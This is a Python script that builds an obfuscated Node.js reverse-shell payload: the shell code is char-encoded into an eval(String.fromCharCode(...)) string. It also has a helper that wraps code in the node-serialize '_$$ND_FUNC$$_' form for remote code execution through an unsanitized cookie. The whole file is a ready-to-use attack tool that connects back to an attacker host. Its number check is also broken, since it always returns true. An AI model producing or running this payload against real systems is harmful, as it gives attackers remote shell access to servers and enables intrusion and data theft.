#!/usr/bin/env python3
# This python script returns a function in nodejs that executes a reverse shell.
# It can be used as a module or in command line.
#
# It's a porting of the script nodejsshell.py located at the following url:
# https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

from sys import argv

NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
'''

def main():
    if len(argv) != 3:
        print("Usage: %s <address> <port>" % argv[0])
        return -1

    elif not is_num(argv[2]):
        print("Port is not a number.")
        return -2

    elif int(argv[2]) > 65535 or int(argv[2]) < 0:
        print("Port number must be between 0 and 65535 inclusive.")
        return -3
    else:
        print(payload_maker(argv[1], argv[2]))

def is_num(num):
    ''' Check if argument is a valid number'''
    try:
        int(num)
    except ValueError:
        return False
    finally:
        return True

def charencode(text):
    '''Returns chars' unicode values'''
    if not isinstance(text, str):
       raise TypeError("Argument must be str not " + str(type(text)))

    encoded = ""
    for c in text:
        encoded += "%s," % str(ord(c))
    return encoded[:-1]

def cookie_rce(jscode_payload):
    '''Passing a nodejs code, it returns a crafted string that can be
       used inside a cookie for rce if input wasn't sanitized'''
    if not isinstance(jscode_payload, str):
       raise TypeError("Argument must be str not " + str(type(jscode_payload)))

    #payload = "_$$ND_FUNC$$_function (){" + jscode_payload + "}()"
    #return payload
    return "_$$ND_FUNC$$_function (){%s}()" % jscode_payload

def payload_maker(address, port):
    '''Passing local address and port, returns a nodejs code that executes a 
    reverse shell'''
    if not isinstance(address, str):
        raise TypeError("Argument 'address' must be str not "+str(type(address)))
    elif not is_num(port):
        raise TypeError("Argument 'port' must be a number")
    elif int(port) < 0 or int(port) > 65535:
        raise TypeError("Port number must be between 0 and 65535 inclusive.")

    rev_shell = NODEJS_REV_SHELL % (address, port)
    encoded_shell = charencode(rev_shell)
    final_payload = "eval(String.fromCharCode(%s))" % encoded_shell
    return final_payload

if __name__ == "__main__":
    main()
